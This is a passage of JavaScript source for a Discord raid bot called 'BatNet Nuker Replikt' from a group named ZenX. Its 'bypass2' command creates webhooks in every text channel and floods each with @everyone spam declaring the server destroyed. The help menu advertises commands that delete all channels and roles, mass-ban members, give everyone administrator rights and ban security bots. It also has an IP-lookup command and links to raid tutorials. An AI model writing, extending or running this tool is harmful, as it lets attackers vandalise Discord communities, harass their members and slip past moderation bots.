            .setTitle(`$ Channels`)
            .setDescription(`> **Sending messages...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (const ch of chs.values()) {
            spam_ch(ch.id);
        };
    };
    if(msg.content === prefix+"bypass2"){
        async function wh_spam(whtoken,whid) {
            const wh = new WebhookClient({id:whid, token:whtoken});
            for (let index = 0; index < 30; index++) {
                await wh.send({content:`> - [ ||@everyone|| ]\n> ** https://discord.gg/zCQ8jQ2GBf **\n> ** https://dsc.gg/zenxcorpp **`, embeds:[
                    new EmbedBuilder()
                    .setImage(`https://cdn.discordapp.com/attachments/1161131445268525116/1167800602567397426/picasion.com_c642a65df1484b8d69da558099082bb9.gif?ex=654f7210&is=653cfd10&hm=53ed05fda49076f74d6a4be979cb4a89f4928a09193f1d19d53f2d2918c5f2fe&`)
                    .setTitle(`⸸                Servidor destruido por Zen𝐗                ⸸\n                                #Zen𝐗𝐎n𝐓op                             `)
                    .setDescription(`󠀠‎\n ‎ **› ‎ ‎ ‎ ‎ Si quieres recuperar tu servidor entra a ZenX ! ‎ ‎ ‎ ‎ ‹**\n\n\`\`\`yaml\nbot r͢a͢id  ×   discord̲ too̲l̲s̲   ×  s̲hop\`\`\`\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ------------------  Ж  ------------------\n\n**。Servidor de ZenX: [Invitación](https://discord.gg/zCQ8jQ2GBf)**\n\n**。Youtube: [Cómo raidear un servidor de Discord?](https://www.youtube.com/watch?v=umo4zcoOrdI)**\n**。Youtube: [Raid Tool Gratis (SRT)](https://www.youtube.com/watch?v=YUIKf2bxvE8)**\n\n-------------------------  Ж  -------------------------`)
                ]});
            };
        };
        async function wh_create(ch) {
            ch.createWebhook({name:`$ ZenX Corp`,avatar:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`}).then((wh)=>{wh_spam(wh.token,wh.id)});
        };
        const chs = (await msg.guild.channels.fetch()).filter(ch=>ch.type===ChannelType.GuildText);
        let i=0;
        if(chs.size===0){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Webhooks`)
                .setDescription(`> **No text channels**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        };
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Webhooks`)
            .setDescription(`> **Creation and sending of webhooks...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let ch of chs.values()) {
            i++;
            try {
                wh_create(ch);
            } catch (e) {
                console.log(e);
            };
        };
    };
    //Extra Commands
    //Utilities
    if(command === "ip_check"){
        if(args.length < 1){
            await msg.channel.send({content:`Proporciona una IP!`});
            return;
        };
        const msgxd = await msg.channel.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Bot invite`)
            .setDescription(`> **Getting IP information...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        let ip_inf = await whoiser.ip(args[0]).catch(async()=>{
            await msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Bot invite`)
                .setDescription(`> **No IP information was found**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});return;
        });
        if(ip_inf){
            const sort_json = Object.keys(ip_inf).reduce((acc, key) => {
                    acc[key] = ip_inf[key];
                    return acc;
            }, {});
            let ip_info_t = JSON.stringify(sort_json, null, 2);
            await wait_ms(2000);
            fs.writeFileSync(`${msg.author.id}-ip.txt`, ip_info_t, 'utf-8');
            await msgxd.edit({files:[`./${msg.author.id}-ip.txt`], embeds:[
                new EmbedBuilder()
                .setTitle(`$ Bot invite`)
                .setDescription(`> **Information obtained!**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]}).then(()=>{fs.unlinkSync(`${msg.author.id}-ip.txt`);});
        }
    };
    if(msg.content === prefix+"stats"){
        await msg.channel.send({content:`> Mano no hay stats XD, en fin https://discord.gg/zCQ8jQ2GBf @everyone`});
    };
    //Bot
    if(msg.content === prefix+"help" || msg.content === `<@${client.user.id}>`){
        await msg.channel.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Raiding commmands`)
            .setDescription(`**Display raiding commands.**\n**Prefix: ${prefix} or mention me.**\n\n**$ Channels**\n> ${prefix}clear_channels -> Delete all guild channels\n> ${prefix}nuke -> Delete all channels and create other for execute other commands.\n> ${prefix}raid -> Destroy server with a lof of pings\n> ${prefix}spam -> Spam all guild channels\n> ${prefix}spam2 -> Spam all guild channels (With webhooks)\n> ${prefix}edit_channels -> Edit all channels into the guild\n> ${prefix}clear_categories -> Clear categories into the guild\n\n**$ Members**\n> ${prefix}massban -> Ban all possible guild members\n> ${prefix}ban_boosters -> Ban all possible boosters in the guild\n> ${prefix}ban_security -> Ban all security bots\n> ${prefix}ban_bots -> Ban all possible bots\n> ${prefix}mdall -> Sends md to all possible members\n\n**$ Roles**\n> ${prefix}clear_roles -> Delete all possible guild roles\n> ${prefix}create_roles -> Create 50 roles into the guild\n> ${prefix}admin -> Gives you administrator permissions into the guild\n> ${prefix}admin_all Gives administration permissions to all users\n> ${prefix}edit_roles -> Edit all roles in the guild\n\n**$ Emojis**\n> ${prefix}clear_emojis -> Delete all possible guild emojis\n\n**$ Guild**\n> ${prefix}change_photo -> Change guild appareance (photo & name)\n> ${prefix}edit_community -> Edit community settings (description, channels, etc)\n\n**$ Bypasses**\n> ${prefix}bypass -> Normal bypass (Without webhooks)\n> ${prefix}bypass2 -> High bypass (With webhooks)`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`}),
            new EmbedBuilder()
            .setTitle(`$ Extra commmands`)
            .setDescription(`**Displaying extra commands.**\n**Prefix: ${prefix} or mention me.**\n\n**$ Utilities**\n> ${prefix}ip_check -> Check an IP Adress (city, coordinates, telephony, etc)\n> ${prefix}stats -> See raid stats (members, owner id, guild name)\n\n**$ Bot**\n> ${prefix}help -> Send this embed\n> ${prefix}invite -> Invite BatNet into another guild\n> ${prefix}info -> Send bot's information (version, developers, etc)\n> ${prefix}cpu -> View usable CPU\n> ${prefix}ping -> View bot's latency`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`}),
            new EmbedBuilder()
            .setTitle(`$ Announce`)
            .setDescription(`**Total commands: 30 commands**\n**available, bot replikt with love by [ZenX Corp Team](https://discord.gg/zCQ8jQ2GBf) .**\n**Recommended this bot to a friend.**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
    };
    if(msg.content === prefix+"invite"){
        await msg.channel.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Bot invite`)
            .setDescription(`> **Invite link: ||https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot||**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
    };
    if(msg.content === prefix+"info"){
        await msg.channel.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Bot information`)
            .setDescription(`**Bot name: BatNet Nuker**\n**Total commands: 30**\n**Version: Replikt**\n\n**Replikt by: [$ ZenX Corp Team](https://discord.gg/zCQ8jQ2GBf)**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
    };
    if(msg.content === prefix+"cpu"){
        await msg.channel.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Bot information`)
            .setDescription(`> **CPU usage: ${(await system.currentLoad()).currentLoad.toFixed(1)}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
    };
    if(msg.content === prefix+"ping"){
        await msg.channel.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Bot information`)
            .setDescription(`> **Bot latency is: ${Math.round(Date.now()-msg.createdTimestamp)}ms**\n> **API latency is ${client.ws.ping}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
    };
});
client.login(bot_token).catch(()=>{console.log(`${chalk.red(`[x]`)} Verifica el token del bot o sus permisos.`)});